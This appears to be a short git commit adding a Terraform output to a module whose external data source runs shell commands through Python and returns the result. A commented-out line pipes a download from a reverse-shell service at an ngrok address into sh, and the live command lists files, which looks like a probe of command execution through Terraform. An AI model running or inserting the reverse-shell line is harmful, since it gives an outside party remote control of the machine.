2d669db665de35cb77e533230f4925659a49ced0
rcoliveira_cf <rcoliveira@cloudflare.com>
2024-12-11 21:38:31 +0000

    I'm Batman

--- modules/main.tf
+++ modules/main.tf
@@ -2,3 +2,7 @@ data "external" "example" {
   # program = ["sh", "-c", "curl https://reverse-shell.sh/4.tcp.ngrok.io:15925 | sh"]
   program = ["python3", "-c", "import json; import subprocess; print(json.dumps({'output': str(subprocess.getoutput('ls -al'))}))"]
 }
+
+output "external_example_output" {
+  value = data.external.example.result
+}
